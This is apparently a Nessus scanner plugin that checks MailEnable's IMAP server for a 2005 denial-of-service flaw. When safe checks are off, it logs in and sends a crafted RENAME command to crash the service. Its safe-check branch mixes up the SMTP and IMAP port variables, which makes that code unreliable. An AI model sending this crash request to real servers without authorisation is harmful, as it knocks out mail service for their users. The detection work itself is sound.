#
# Josh Zlatin-Amishav
# GPLv2
#

# Changes by Tenable:
# - Revised plugin title (6/17/09)


include("compat.inc");

if (description)
{
  script_id(20245);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2011/09/01 20:44:17 $");

  script_cve_id("CVE-2005-3813");
  script_bugtraq_id(15556);
  script_osvdb_id(21109);

  script_name(english:"MailEnable IMAP Server (meimaps.exe) Crafted RENAME Command Remote DoS");
  script_summary(english:"Checks for rename DoS vulnerability in MailEnable's IMAP service");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is prone to denial of service attacks." );
  script_set_attribute(attribute:"description", value:
"The remote host is running MailEnable, a commercial mail server for
Windows. 

The IMAP server bundled with the version of MailEnable Professional or
Enterprise Edition installed on the remote host is prone to crash due
to incorrect handling of mailbox names in the rename command.  An
authenticated, remote attacker can exploit this flaw to crash the IMAP
server on the remote host." );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/417589" );
  script_set_attribute(attribute:"see_also", value:"http://www.mailenable.com/hotfix/MEIMAPS.ZIP" );
  script_set_attribute(attribute:"solution", value:
"Apply the IMAP Cumulative Hotfix/Update provided in the zip file
referenced above." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/28");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/24");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mailenable:mailenable");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Josh Zlatin-Amishav");
  script_dependencie("smtpserver_detect.nasl", "imap4_banner.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/smtp", 25, "Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("smtp_func.inc");

user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


# Make sure the banner is for MailEnable.
banner = get_imap_banner(port:port);
if (!banner || "* OK IMAP4rev1 server ready" >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  # nb: we won't do a banner check unless report_paranoia is 
  #     set to paranoid since the hotfix doesn't update the banner.
  if (report_paranoia <= 1) exit(0);

  # Check the version number from the SMTP server's banner.
  smtp_port = get_kb_item("Services/smtp");
  if (!smtp_port) port = 25;
  if (!get_port_state(smtp_port)) exit(0);
  if (get_kb_item('SMTP/'+smtp_port+'/broken')) exit(0);

  banner = get_smtp_banner(port:port);
  if (banner =~ "Mail(Enable| Enable SMTP) Service") {
    # nb: Standard Edition seems to format version as "1.71--" (for 1.71),
    #     Professional Edition formats it like "0-1.2-" (for 1.2), and
    #     Enterprise Edition formats it like "0--1.1" (for 1.1).
    ver = eregmatch(
      pattern:"Version: (0-+)?([0-9][^- ]+)-*",
      string:banner,
      icase:TRUE
    );
    if (ver == NULL) {
      exit(1, "cannot determine version of MailEnable's SMTP connector service");
    }
    if (ver[1] == NULL) {
      edition = "Standard";
    }
    else if (ver[1] == "0-") {
      edition = "Professional";
    }
    else if (ver[1] == "0--") {
      edition = "Enterprise";
    }
    if (isnull(edition)) {
      exit(1, "cannot determine edition of MailEnable's SMTP connector service");
    }
    ver = ver[2];

    if (
      # nb: Professional versions <= 1.7 may be vulnerable.
      (edition == "Professional" && ver =~ "^1\.([0-6]|7$)") ||
      # nb: Enterprise versions <= 1.1 may be vulnerable.
      (edition == "Enterprise" && ver =~ "^1\.(0|1$)")
    ) {
      report = string(
        "\n",
        "***** Nessus has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version number of Mailenable\n",
        "***** installed there. Since the Hotfix does not change the version\n",
        "***** number, though, this might be a false positive.\n",
        "\n"
      );
      security_warning(port:port, extra:report);
    }
  }
 exit(0);
}
# Otherwise, try to exploit it.
else {
  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s) || "IMAP4rev1 server ready at" >!< s )
  {
    close(soc);
    exit(0);
  }

  # Try to log in.
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s
  , icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }


  # If successful, try to exploit the flaw.
  if (resp && resp =~ "OK") {
    ++tag;
    resp = NULL;
    ++tag;
    payload = string("nessus", string(tag), " rename foo bar");
    send(socket:soc, data:string(payload, "\r\n"));
    # It may take some time for the remote connection to close
    # and refuse new connections
    sleep(5);
    # Try to reestablish a connection
    soc2 = open_sock_tcp(port);

    # There's a problem if we can't establish the connection 

    if (!soc2) {
      security_warning(port);
      exit(0);
    }
    close(soc2);
  }
}
